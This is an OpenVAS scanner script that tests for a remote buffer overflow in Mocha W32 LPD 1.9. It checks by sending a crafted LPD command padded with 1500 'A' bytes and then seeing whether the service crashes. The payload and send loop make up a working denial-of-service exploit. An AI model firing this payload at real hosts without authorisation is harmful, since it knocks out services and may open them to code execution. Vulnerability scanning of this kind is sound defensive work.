###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mocha_w32_lpd_39498.nasl 8438 2018-01-16 17:38:23Z teissa $
#
# Mocha W32 LPD Remote Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Mocha W32 LPD is prone to a remote buffer-overflow vulnerability
because the software fails to perform adequate boundary checks on user-
supplied data.

Successful exploits may allow attackers to execute arbitrary code with
the privileges of the user running the affected application. Failed
exploit attempts will result in a denial-of-service condition.

This issue affects W32 LPD 1.9; other versions may be
vulnerable as well.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100580");
 script_version("$Revision: 8438 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-16 18:38:23 +0100 (Tue, 16 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-04-19 20:46:01 +0200 (Mon, 19 Apr 2010)");
 script_bugtraq_id(39498);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Mocha W32 LPD Remote Buffer Overflow Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39498");
 script_xref(name : "URL" , value : "http://mochasoft.dk/lpd.htm");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/lpd", 515);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");

function check_lpd(port) {
 
  soc = open_priv_sock_tcp(dport:port);
  if(!soc)return FALSE;

  data = string("OpenVAS", rand());
  req = raw_string(0x04) + data + " " + raw_string(0x0a);
  send(socket:soc, data:req);
  res = recv(socket:soc, length:1024);
  close(soc);

  if(!res || "printer" >!< tolower(res))return FALSE;

  return TRUE;
}  

if(safe_checks())exit(0);

port = get_kb_item("Services/lpd");
if(!port)port="515";

if(!get_port_state(port))exit(0);

if(!check_lpd(port:port))exit(0);

exploit  = raw_string("\x05\x64\x65\x66\x61\x75\x6c\x74\x20");
exploit += crap(data:raw_string("\x41"),length:1500);
exploit += raw_string("\x20\x61\x6c\x6c\x0a");

for(i=0;i<5;i++) {
  soc = open_sock_tcp(port);
  if(!soc)break;
  send(socket:soc, data:raw_string("\x02"));
  send(socket:soc, data:exploit);
  close(soc);
  sleep(1);
}

if(!check_lpd(port:port)) {
  security_message(port:port);
  exit(0);
}  

exit(0);
